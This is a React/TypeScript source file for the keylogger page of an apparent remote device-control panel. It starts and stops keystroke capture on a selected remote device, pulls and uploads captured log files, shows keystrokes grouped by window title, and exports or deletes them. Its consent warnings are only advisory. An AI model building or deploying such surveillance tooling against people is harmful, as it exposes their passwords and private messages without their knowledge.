import { useState, useEffect, useCallback } from 'react';
import { api } from '../api/client';
import { useAppStore } from '../store/appStore';
import { pollCommandResult } from '../utils/commandPoller';
import {
  Play,
  Square,
  RefreshCw,
  Download,
  AlertTriangle,
  Eye,
  Clock,
  Upload,
  Trash2,
  File,
  FileCheck,
  FileClock,
} from 'lucide-react';

interface KeylogEntry {
  id: string;
  timestamp: string;
  key: string;
  window_title?: string;
}

interface KeylogFile {
  filename: string;
  size: number;
  status: 'active' | 'completed' | 'temporary' | 'ready_for_upload';
  type: 'original' | 'uploaded';
  created: string;
  modified: string;
  readable_size: string;
}

export function KeyloggerPage() {
  const [status, setStatus] = useState<'running' | 'stopped' | 'unknown'>('unknown');
  const [sessionId, setSessionId] = useState<string | null>(null);
  const [keystrokeCount, setKeystrokeCount] = useState(0);
  const [keylogs, setKeylogs] = useState<KeylogEntry[]>([]);
  const [loading, setLoading] = useState(false);
  const [viewMode, setViewMode] = useState<'text' | 'timeline' | 'files'>('text');
  const [startDate, setStartDate] = useState('');
  const [endDate, setEndDate] = useState('');
  const [logFiles, setLogFiles] = useState<KeylogFile[]>([]);
  const [fileStats, setFileStats] = useState<{active: number; completed: number; temporary: number; ready_for_upload: number}>({
    active: 0, completed: 0, temporary: 0, ready_for_upload: 0
  });
  const [uploadStatus, setUploadStatus] = useState('');
  const [viewingFile, setViewingFile] = useState<{filename: string; content: string[]; lines: number} | null>(null);
  const [fileLoading, setFileLoading] = useState<string | null>(null);
  const selectedDeviceId = useAppStore((s) => s.selectedDeviceId);

  const fetchStatus = useCallback(async () => {
    if (!selectedDeviceId) return;

    try {
      const data = await api.getKeyloggerStatus(selectedDeviceId);
      setStatus(data.is_running ? 'running' : 'stopped');
      setSessionId(data.session_id || null);
      setKeystrokeCount(data.keylog_count || 0);
    } catch (err) {
      console.error('Failed to fetch keylogger status:', err);
    }
  }, [selectedDeviceId]);

  const fetchKeylogs = useCallback(async () => {
    if (!selectedDeviceId) return;
    setLoading(true);

    try {
      const data = await api.getKeylogs(selectedDeviceId, startDate, endDate, sessionId || undefined);
      setKeylogs(data.keylogs);
    } catch (err) {
      console.error('Failed to fetch keylogs:', err);
    } finally {
      setLoading(false);
    }
  }, [selectedDeviceId, startDate, endDate, sessionId]);

  const fetchLogFiles = useCallback(async () => {
    if (!selectedDeviceId) return;

    try {
      const result = await api.sendCommand(selectedDeviceId, 'keylogger', 'list');
      const response = await pollCommandResult({ commandId: result.command_id, maxAttempts: 20, delayMs: 500 });
      
      if (response.exit_code === 0) {
        const data = JSON.parse(response.output.join(''));
        setLogFiles(data.files || []);
        setFileStats(data.stats || { active: 0, completed: 0, temporary: 0, ready_for_upload: 0 });
      }
    } catch (err) {
      console.error('Failed to fetch log files:', err);
    }
  }, [selectedDeviceId]);

  const uploadCurrentHour = async () => {
    if (!selectedDeviceId) return;

    try {
      setUploadStatus('Uploading current hour data...');
      const result = await api.sendCommand(selectedDeviceId, 'keylogger', 'upload');
      const response = await pollCommandResult({ commandId: result.command_id, maxAttempts: 20, delayMs: 500 });
      
      if (response.exit_code === 0) {
        const data = JSON.parse(response.output.join(''));
        switch (data.status) {
          case 'uploaded':
            setUploadStatus(`✓ Uploaded: ${data.filename} (${data.lines} lines, ${data.is_complete ? 'complete' : 'temporary'})`);
            break;
          case 'already_uploaded':
            setUploadStatus(`ℹ Already uploaded: ${data.filename}`);
            break;
          case 'no_logs':
          case 'no_current_file':
            setUploadStatus(`ℹ ${data.message || 'No logs to upload'}`);
            break;
          default:
            setUploadStatus(`Status: ${data.message || data.status || 'Unknown'}`);
        }
        await fetchLogFiles(); // Refresh file list
      } else {
        setUploadStatus('✗ Upload failed');
      }
      
      setTimeout(() => setUploadStatus(''), 5000);
    } catch (err) {
      console.error('Failed to upload:', err);
      setUploadStatus('✗ Upload failed');
      setTimeout(() => setUploadStatus(''), 5000);
    }
  };

  const viewFile = async (filename: string) => {
    if (!selectedDeviceId) return;
    
    try {
      setFileLoading(filename);
      const result = await api.sendCommand(selectedDeviceId, 'keylogger', `get:${filename}`);
      const response = await pollCommandResult({ commandId: result.command_id, maxAttempts: 20, delayMs: 500 });
      
      if (response.exit_code === 0) {
        const data = JSON.parse(response.output.join(''));
        if (data.error) {
          setUploadStatus(`✗ ${data.error}`);
          setTimeout(() => setUploadStatus(''), 3000);
        } else {
          setViewingFile({
            filename: data.filename,
            content: data.content || [],
            lines: data.lines || 0
          });
        }
      }
    } catch (err) {
      console.error('Failed to view file:', err);
      setUploadStatus('✗ Failed to load file');
      setTimeout(() => setUploadStatus(''), 3000);
    } finally {
      setFileLoading(null);
    }
  };

  const uploadSpecificFile = async (filename: string) => {
    if (!selectedDeviceId) return;
    
    try {
      setFileLoading(filename);
      setUploadStatus(`Uploading ${filename}...`);
      const result = await api.sendCommand(selectedDeviceId, 'keylogger', `upload:${filename}`);
      const response = await pollCommandResult({ commandId: result.command_id, maxAttempts: 20, delayMs: 500 });
      
      if (response.exit_code === 0) {
        const data = JSON.parse(response.output.join(''));
        if (data.status === 'uploaded') {
          setUploadStatus(`✓ Uploaded: ${data.filename}`);
        } else {
          setUploadStatus(`ℹ ${data.message || data.status}`);
        }
        await fetchLogFiles();
      } else {
        setUploadStatus('✗ Upload failed');
      }
      
      setTimeout(() => setUploadStatus(''), 3000);
    } catch (err) {
      console.error('Failed to upload file:', err);
      setUploadStatus('✗ Upload failed');
      setTimeout(() => setUploadStatus(''), 3000);
    } finally {
      setFileLoading(null);
    }
  };

  const deleteAllFiles = async () => {
    if (!selectedDeviceId || !confirm('Delete ALL keylog files? This cannot be undone.')) return;

    try {
      setUploadStatus('Deleting all files...');
      const result = await api.sendCommand(selectedDeviceId, 'keylogger', 'delete');
      const response = await pollCommandResult({ commandId: result.command_id, maxAttempts: 20, delayMs: 500 });
      
      if (response.exit_code === 0) {
        const data = JSON.parse(response.output.join(''));
        setUploadStatus(`Deleted ${data.deleted_count} files`);
        await fetchLogFiles(); // Refresh file list
      } else {
        setUploadStatus('Delete failed');
      }
      
      setTimeout(() => setUploadStatus(''), 5000);
    } catch (err) {
      console.error('Failed to delete files:', err);
      setUploadStatus('Delete failed');
      setTimeout(() => setUploadStatus(''), 5000);
    }
  };

  const deleteFile = async (filename: string) => {
    if (!selectedDeviceId || !confirm(`Delete ${filename}? This cannot be undone.`)) return;

    try {
      setUploadStatus(`Deleting ${filename}...`);
      const result = await api.sendCommand(selectedDeviceId, 'keylogger', `delete:${filename}`);
      const response = await pollCommandResult({ commandId: result.command_id, maxAttempts: 20, delayMs: 500 });
      
      if (response.exit_code === 0) {
        setUploadStatus(`Deleted ${filename}`);
        await fetchLogFiles(); // Refresh file list
      } else {
        setUploadStatus(`Failed to delete ${filename}`);
      }
      
      setTimeout(() => setUploadStatus(''), 5000);
    } catch (err) {
      console.error('Failed to delete file:', err);
      setUploadStatus(`Failed to delete ${filename}`);
      setTimeout(() => setUploadStatus(''), 5000);
    }
  };

  useEffect(() => {
    fetchStatus();
    fetchLogFiles();
    const interval = setInterval(() => {
      fetchStatus();
      if (viewMode === 'files') {
        fetchLogFiles();
      }
    }, 5000);
    return () => clearInterval(interval);
  }, [fetchStatus, fetchLogFiles, viewMode]);

  useEffect(() => {
    if (viewMode !== 'files') {
      fetchKeylogs();
    }
  }, [fetchKeylogs, viewMode]);

  const handleStart = async () => {
    if (!selectedDeviceId) return;
    
    const confirmed = confirm(
      '⚠️ WARNING: Starting keylogger\n\n' +
      'Ensure you have:\n' +
      '✓ Proper authorization\n' +
      '✓ User consent\n' +
      '✓ Legal compliance\n\n' +
      'Unauthorized use may be illegal.\n\n' +
      'Continue?'
    );

    if (!confirmed) return;

    try {
      await api.startKeylogger(selectedDeviceId);
      await fetchStatus();
    } catch (err) {
      alert(err instanceof Error ? err.message : 'Failed to start keylogger');
    }
  };

  const handleStop = async () => {
    if (!selectedDeviceId) return;

    try {
      await api.stopKeylogger(selectedDeviceId);
      await fetchStatus();
    } catch (err) {
      alert(err instanceof Error ? err.message : 'Failed to stop keylogger');
    }
  };

  const downloadKeylogs = () => {
    const text = keylogs.map(log => 
      `[${log.timestamp}] ${log.window_title || 'Unknown'}: ${log.key}`
    ).join('\n');

    const blob = new Blob([text], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `keylogs-${selectedDeviceId}-${Date.now()}.txt`;
    a.click();
    URL.revokeObjectURL(url);
  };

  const formatKey = (key: string) => {
    // Handle special keys
    if (key.startsWith('[') && key.endsWith(']')) {
      return <span className="text-yellow-400 text-xs">{key}</span>;
    }
    // Handle whitespace
    if (key === ' ') {
      return <span className="text-gray-500">␣</span>;
    }
    if (key === '\n') {
      return <span className="text-gray-500">↵</span>;
    }
    if (key === '\t') {
      return <span className="text-gray-500">⇥</span>;
    }
    return key;
  };

  const renderText = () => {
    let currentWindow = '';
    const lines: React.ReactElement[] = [];
    let lineBuffer: React.ReactElement[] = [];
    let lineIndex = 0;

    keylogs.forEach((log, i) => {
      if (log.window_title && log.window_title !== currentWindow) {
        if (lineBuffer.length > 0) {
          lines.push(
            <div key={`line-${lineIndex++}`} className="mb-1">
              {lineBuffer}
            </div>
          );
          lineBuffer = [];
        }
        currentWindow = log.window_title;
        lines.push(
          <div key={`window-${i}`} className="mt-3 mb-1 text-blue-400 text-sm font-semibold border-l-2 border-blue-400 pl-2">
            {currentWindow}
          </div>
        );
      }

      lineBuffer.push(
        <span key={log.id}>{formatKey(log.key)}</span>
      );

      if (log.key === '\n' || log.key.includes('ENTER')) {
        lines.push(
          <div key={`line-${lineIndex++}`} className="mb-1">
            {lineBuffer}
          </div>
        );
        lineBuffer = [];
      }
    });

    if (lineBuffer.length > 0) {
      lines.push(
        <div key={`line-${lineIndex}`} className="mb-1">
          {lineBuffer}
        </div>
      );
    }

    return <div className="font-mono text-sm whitespace-pre-wrap">{lines}</div>;
  };

  const renderTimeline = () => {
    return (
      <div className="space-y-2">
        {keylogs.map((log) => (
          <div key={log.id} className="flex items-start gap-3 text-sm border-l-2 border-gray-700 pl-3 py-1 hover:bg-gray-700/30">
            <span className="text-gray-500 text-xs w-40 flex-shrink-0">
              {new Date(log.timestamp).toLocaleString()}
            </span>
            <span className="text-gray-400 text-xs flex-1 truncate">
              {log.window_title || 'Unknown'}
            </span>
            <span className="font-mono text-white">
              {formatKey(log.key)}
            </span>
          </div>
        ))}
      </div>
    );
  };

  const renderFiles = () => {
    const getStatusIcon = (status: string) => {
      switch (status) {
        case 'completed': return <FileCheck className="h-4 w-4 text-green-400" />;
        case 'temporary': return <FileClock className="h-4 w-4 text-yellow-400" />;
        case 'ready_for_upload': return <Upload className="h-4 w-4 text-blue-400" />;
        default: return <File className="h-4 w-4 text-gray-400" />;
      }
    };

    const getStatusColor = (status: string) => {
      switch (status) {
        case 'completed': return 'text-green-400';
        case 'temporary': return 'text-yellow-400';
        case 'ready_for_upload': return 'text-blue-400';
        default: return 'text-gray-400';
      }
    };

    return (
      <div className="space-y-4">
        {uploadStatus && (
          <div className="bg-blue-600/20 border border-blue-500/30 rounded-lg p-3 text-blue-300 text-sm">
            {uploadStatus}
          </div>
        )}
        
        <div className="grid grid-cols-4 gap-4 text-sm">
          <div className="bg-gray-800 rounded p-3 text-center">
            <div className="text-2xl font-bold text-green-400">{fileStats.completed}</div>
            <div className="text-gray-400">Completed</div>
          </div>
          <div className="bg-gray-800 rounded p-3 text-center">
            <div className="text-2xl font-bold text-yellow-400">{fileStats.temporary}</div>
            <div className="text-gray-400">Temporary</div>
          </div>
          <div className="bg-gray-800 rounded p-3 text-center">
            <div className="text-2xl font-bold text-blue-400">{fileStats.ready_for_upload}</div>
            <div className="text-gray-400">Ready</div>
          </div>
          <div className="bg-gray-800 rounded p-3 text-center">
            <div className="text-2xl font-bold text-gray-400">{fileStats.active}</div>
            <div className="text-gray-400">Active</div>
          </div>
        </div>

        <div className="space-y-2">
          {logFiles.length === 0 ? (
            <div className="text-gray-500 text-center py-8">
              No log files found. Start keylogger to begin logging.
            </div>
          ) : (
            logFiles.map((file) => (
              <div key={file.filename} className="flex items-center gap-4 p-3 bg-gray-800 rounded hover:bg-gray-700/50 transition-colors">
                <div className="flex items-center gap-2">
                  {getStatusIcon(file.status)}
                  <span className="font-mono text-sm">{file.filename}</span>
                </div>
                
                <div className="flex-1 text-sm text-gray-400">
                  <span>{file.readable_size || '0 B'}</span>
                  <span className="mx-2">•</span>
                  <span className={getStatusColor(file.status)}>
                    {(file.status || 'unknown').replace('_', ' ')}
                  </span>
                  <span className="mx-2">•</span>
                  <span>{file.modified ? new Date(file.modified).toLocaleString() : 'Unknown'}</span>
                </div>

                <div className="flex gap-2">
                  {/* View button - for uploaded files (completed/temporary) */}
                  {(file.status === 'completed' || file.status === 'temporary') && (
                    <button
                      onClick={() => viewFile(file.filename)}
                      disabled={fileLoading === file.filename}
                      className="p-1 text-blue-400 hover:text-blue-300 hover:bg-blue-500/20 rounded disabled:opacity-50"
                      title={`View ${file.filename}`}
                    >
                      {fileLoading === file.filename ? (
                        <RefreshCw className="h-4 w-4 animate-spin" />
                      ) : (
                        <Eye className="h-4 w-4" />
                      )}
                    </button>
                  )}
                  
                  {/* Upload button - for files ready to upload */}
                  {file.status === 'ready_for_upload' && (
                    <button
                      onClick={() => uploadSpecificFile(file.filename)}
                      disabled={fileLoading === file.filename}
                      className="p-1 text-green-400 hover:text-green-300 hover:bg-green-500/20 rounded disabled:opacity-50"
                      title={`Upload ${file.filename}`}
                    >
                      {fileLoading === file.filename ? (
                        <RefreshCw className="h-4 w-4 animate-spin" />
                      ) : (
                        <Upload className="h-4 w-4" />
                      )}
                    </button>
                  )}
                  
                  <button
                    onClick={() => deleteFile(file.filename)}
                    className="p-1 text-red-400 hover:text-red-300 hover:bg-red-500/20 rounded"
                    title={`Delete ${file.filename}`}
                  >
                    <Trash2 className="h-4 w-4" />
                  </button>
                </div>
              </div>
            ))
          )}
        </div>
      </div>
    );
  };

  if (!selectedDeviceId) {
    return (
      <div className="flex items-center justify-center h-64 text-gray-400">
        <p>Select a device to manage keylogger</p>
      </div>
    );
  }

  return (
    <div className="space-y-4">
      {/* Warning Banner */}
      <div className="bg-yellow-500/20 border border-yellow-500 rounded-lg p-4 flex items-start gap-3">
        <AlertTriangle className="h-5 w-5 text-yellow-400 flex-shrink-0 mt-0.5" />
        <div className="text-sm text-yellow-200">
          <p className="font-semibold mb-1">Keylogger Ethics & Legal Warning</p>
          <p>Use only with proper authorization, user consent, and in compliance with local laws. Unauthorized use may be illegal.</p>
        </div>
      </div>

      {/* Controls */}
      <div className="bg-gray-800 rounded-lg p-4">
        <div className="flex items-center justify-between mb-4">
          <div>
            <h2 className="text-lg font-semibold text-white">Keylogger Control</h2>
            <div className="flex items-center gap-2 mt-1">
              <span className={`inline-flex items-center gap-1 px-2 py-1 rounded text-sm ${
                status === 'running' ? 'bg-green-500/20 text-green-400' : 'bg-gray-700 text-gray-400'
              }`}>
                <div className={`h-2 w-2 rounded-full ${status === 'running' ? 'bg-green-400' : 'bg-gray-500'}`} />
                {status === 'running' ? 'Active' : 'Stopped'}
              </span>
              {status === 'running' && (
                <span className="text-sm text-gray-400">
                  {keystrokeCount} keystrokes captured
                </span>
              )}
            </div>
          </div>
          <div className="flex gap-2">
            <button
              onClick={handleStart}
              disabled={status === 'running'}
              className="flex items-center gap-2 px-4 py-2 bg-green-600 hover:bg-green-700 disabled:bg-gray-600 disabled:cursor-not-allowed rounded text-white transition-colors"
            >
              <Play className="h-4 w-4" />
              Start
            </button>
            <button
              onClick={handleStop}
              disabled={status !== 'running'}
              className="flex items-center gap-2 px-4 py-2 bg-red-600 hover:bg-red-700 disabled:bg-gray-600 disabled:cursor-not-allowed rounded text-white transition-colors"
            >
              <Square className="h-4 w-4" />
              Stop
            </button>
            <button
              onClick={fetchStatus}
              className="flex items-center gap-2 px-4 py-2 bg-gray-700 hover:bg-gray-600 rounded text-white transition-colors"
            >
              <RefreshCw className="h-4 w-4" />
            </button>
          </div>
        </div>
      </div>

      {/* Viewer */}
      <div className="bg-gray-800 rounded-lg p-4">
        <div className="flex items-center justify-between mb-4">
          <div className="flex items-center gap-4">
            <h3 className="text-lg font-semibold text-white">Captured Data</h3>
            <div className="flex gap-2">
              <button
                onClick={() => setViewMode('text')}
                className={`px-3 py-1 rounded text-sm ${
                  viewMode === 'text' ? 'bg-blue-600 text-white' : 'bg-gray-700 text-gray-400'
                }`}
              >
                <Eye className="h-4 w-4 inline mr-1" />
                Text
              </button>
              <button
                onClick={() => setViewMode('timeline')}
                className={`px-3 py-1 rounded text-sm ${
                  viewMode === 'timeline' ? 'bg-blue-600 text-white' : 'bg-gray-700 text-gray-400'
                }`}
              >
                <Clock className="h-4 w-4 inline mr-1" />
                Timeline
              </button>
              <button
                onClick={() => setViewMode('files')}
                className={`px-3 py-1 rounded text-sm ${
                  viewMode === 'files' ? 'bg-blue-600 text-white' : 'bg-gray-700 text-gray-400'
                }`}
              >
                <File className="h-4 w-4 inline mr-1" />
                Files
              </button>
            </div>
          </div>
          <div className="flex items-center gap-2">
            {viewMode !== 'files' && (
              <>
                <input
                  type="datetime-local"
                  value={startDate}
                  onChange={(e) => setStartDate(e.target.value)}
                  className="bg-gray-700 border border-gray-600 rounded px-2 py-1 text-sm text-white"
                  placeholder="Start date"
                />
                <input
                  type="datetime-local"
                  value={endDate}
                  onChange={(e) => setEndDate(e.target.value)}
                  className="bg-gray-700 border border-gray-600 rounded px-2 py-1 text-sm text-white"
                  placeholder="End date"
                />
                <button
                  onClick={fetchKeylogs}
                  disabled={loading}
                  className="px-4 py-1 bg-blue-600 hover:bg-blue-700 disabled:bg-gray-600 rounded text-white text-sm"
                >
                  {loading ? 'Loading...' : 'Fetch'}
                </button>
                {keylogs.length > 0 && (
                  <button
                    onClick={downloadKeylogs}
                    className="px-4 py-1 bg-gray-700 hover:bg-gray-600 rounded text-white text-sm flex items-center gap-1"
                  >
                    <Download className="h-4 w-4" />
                    Export
                  </button>
                )}
              </>
            )}
            {viewMode === 'files' && (
              <div className="flex gap-2">
                <button
                  onClick={uploadCurrentHour}
                  className="px-4 py-1 bg-green-600 hover:bg-green-700 rounded text-white text-sm flex items-center gap-1"
                >
                  <Upload className="h-4 w-4" />
                  Upload Current Hour
                </button>
                <button
                  onClick={deleteAllFiles}
                  className="px-4 py-1 bg-red-600 hover:bg-red-700 rounded text-white text-sm flex items-center gap-1"
                >
                  <Trash2 className="h-4 w-4" />
                  Delete All
                </button>
                <button
                  onClick={fetchLogFiles}
                  className="px-4 py-1 bg-gray-700 hover:bg-gray-600 rounded text-white text-sm flex items-center gap-1"
                >
                  <RefreshCw className="h-4 w-4" />
                  Refresh
                </button>
              </div>
            )}
          </div>
        </div>

        <div className="bg-gray-900 rounded p-4 max-h-[500px] overflow-auto">
          {viewMode === 'files' ? (
            renderFiles()
          ) : keylogs.length === 0 ? (
            <p className="text-gray-500 text-center py-8">
              No data captured yet. Click "Fetch" to load keylogs.
            </p>
          ) : (
            viewMode === 'text' ? renderText() : renderTimeline()
          )}
        </div>
      </div>
      
      {/* File Viewer Modal */}
      {viewingFile && (
        <div className="fixed inset-0 bg-black/70 flex items-center justify-center z-50">
          <div className="bg-gray-800 rounded-lg shadow-xl max-w-4xl w-full mx-4 max-h-[80vh] flex flex-col">
            <div className="flex items-center justify-between p-4 border-b border-gray-700">
              <div>
                <h3 className="text-lg font-semibold text-white">{viewingFile.filename}</h3>
                <p className="text-sm text-gray-400">{viewingFile.lines} lines</p>
              </div>
              <button
                onClick={() => setViewingFile(null)}
                className="text-gray-400 hover:text-white text-2xl leading-none"
              >
                ×
              </button>
            </div>
            <div className="flex-1 overflow-auto p-4">
              <pre className="font-mono text-sm text-gray-300 whitespace-pre-wrap">
                {viewingFile.content.length > 0 
                  ? viewingFile.content.join('\n')
                  : '(empty file)'}
              </pre>
            </div>
            <div className="p-4 border-t border-gray-700 flex justify-end">
              <button
                onClick={() => setViewingFile(null)}
                className="px-4 py-2 bg-gray-700 hover:bg-gray-600 rounded text-white"
              >
                Close
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
